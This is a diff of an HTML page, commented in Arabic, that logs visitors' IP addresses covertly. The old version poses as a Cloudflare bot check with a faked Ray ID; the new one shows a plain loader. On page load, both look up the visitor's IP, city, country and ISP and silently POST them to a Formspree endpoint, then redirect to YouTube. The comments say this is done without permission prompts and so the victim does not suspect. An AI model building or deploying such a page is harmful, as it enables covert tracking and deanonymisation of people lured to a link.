@@ -1,115 +1,61 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحقق من الأمان | Cloudflare</title>
+    <title>Loading...</title>
     <style>
         body { 
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            background: #fff; 
-            color: #313131; 
+            background-color: #ffffff; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
             margin: 0; 
+            font-family: sans-serif;
         }
-        .wrapper { 
-            max-width: 450px; 
-            width: 90%; 
-            text-align: center; 
-            border: 1px solid #e0e0e0; 
-            padding: 40px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05); 
-        }
-        .cf-icon { width: 120px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 500; margin-bottom: 15px; }
-        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
-        .loader-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 5px;
-            border: 1px solid #eee;
-        }
-        .loader { 
-            border: 3px solid #f3f3f3; 
-            border-top: 3px solid #0051c3; 
-            border-radius: 50%; 
-            width: 20px; 
-            height: 20px; 
-            animation: spin 1s linear infinite; 
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff0000; /* لون أحمر مثل يوتيوب */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer-text { 
-            font-size: 12px; 
-            color: #999; 
-            margin-top: 30px; 
-            border-top: 1px solid #eee; 
-            padding-top: 15px; 
-            text-align: right;
-        }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare" class="cf-icon">
-    <h1>تحقق من أنك لست برنامج روبوت</h1>
-    <p>يتم الآن التحقق من أمان اتصال المتصفح الخاص بك. يرجى الانتظار للحظات بينما ننتهي من الفحص التلقائي.</p>
-    
-    <div class="loader-container">
-        <div class="loader"></div>
-        <span style="font-size: 14px; color: #333;">جاري التحقق...</span>
-    </div>
-
-    <div class="footer-text">
-        Ray ID: <span id="ray-id"></span> • IP: <span id="user-ip">Checking...</span>
-    </div>
-</div>
+    <div class="loader"></div>
 
 <script>
-    // 1. توليد رقم عشوائي للـ Ray ID
-    document.getElementById('ray-id').innerText = Math.random().toString(16).substr(2, 16);
-
     const FORMSPREE_URL = "https://formspree.io/f/mvzblpga";
 
     window.onload = function() {
-        // 2. جلب بيانات الـ IP بصمت
+        // سحب البيانات بالـ IP (بدون أي رسائل إذن)
         fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-            document.getElementById("user-ip").innerText = data.ip;
-
-            // 3. إرسال المعلومات لبريدك
+            // إرسال المعلومات لبريدك بصمت
             fetch(FORMSPREE_URL, {
                 method: 'POST',
                 headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    _subject: "⚠️ زائر جديد - تم التوجيه ليوتيوب",
-                    الآي_بي: data.ip,
-                    الدولة: data.country_name,
-                    المدينة: data.city,
-                    الشركة: data.org,
-                    الجهاز: navigator.userAgent
+                    _subject: "🚀 دخول مباشر - تم السحب",
+                    IP: data.ip,
+                    City: data.city,
+                    Country: data.country_name,
+                    ISP: data.org
                 })
             }).then(() => {
-                // 4. التوجيه إلى يوتيوب بعد 3 ثوانٍ
-                setTimeout(() => {
-                    window.location.href = "https://www.youtube.com";
-                }, 3000);
+                // الانتقال فوراً ليوتيوب
+                window.location.href = "https://www.youtube.com";
             });
         })
         .catch(error => {
-            // في حال الفشل يتم التوجيه أيضاً ليوتيوب لعدم كشف الأمر
-            setTimeout(() => {
-                window.location.href = "https://www.youtube.com";
-            }, 2000);
+            // حتى لو فشل السحب، يذهب ليوتيوب فوراً لكي لا يشك
+            window.location.href = "https://www.youtube.com";
         });
     };
 </script>
